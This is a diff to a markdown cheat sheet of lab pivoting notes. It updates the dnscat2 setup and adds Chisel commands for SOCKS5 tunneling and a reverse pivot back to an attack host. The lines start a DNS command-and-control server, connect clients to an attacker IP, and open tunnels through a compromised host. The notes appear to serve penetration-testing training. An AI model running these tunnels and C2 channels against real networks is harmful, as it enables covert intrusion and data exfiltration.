@@ -191,12 +191,13 @@ git clone https://github.com/iagox86/dnscat2.git
 cd dnscat2/server
 sudo apt update
 sudo apt install ruby ruby-dev libffi-dev build-essential
-gem install bundler
+gem install --user-install bundler
+bundle config set --local path .bundle
 bundle install
 
 # start dnscat2 server (attack host)
 # host is our own kali IP
-sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
+sudo bundle exec ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
 ```
 
 **dnscat2 Client Authentication**
@@ -221,4 +222,29 @@ Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecre
 ```bash
 # Interacting with the Established Session
 dnscat2> window -i 1
+```
+
+# SOCKS5 Tunneling with Chisel
+
+**Note:** If you are getting an error message with chisel on the target, try with a [different version](https://github.com/jpillora/chisel/releases).
+
+```bash
+git clone https://github.com/jpillora/chisel.git
+
+# Running the Chisel Server on the Pivot Host
+# proxychains need to be socks5 127.0.0.1 1080
+./chisel server -v -p 1234 --socks5
+
+# Connecting to the Chisel Server
+./chisel client -v 10.129.202.64:1234 socks
+```
+
+## Reverse Pivot
+
+```bash
+# Starting the Chisel Server on our Attack Host
+sudo ./chisel server --reverse -v -p 1234 --socks5
+
+# Connecting the Chisel Client to our Attack Host
+./chisel client -v 10.10.14.17:1234 R:socks
 ```
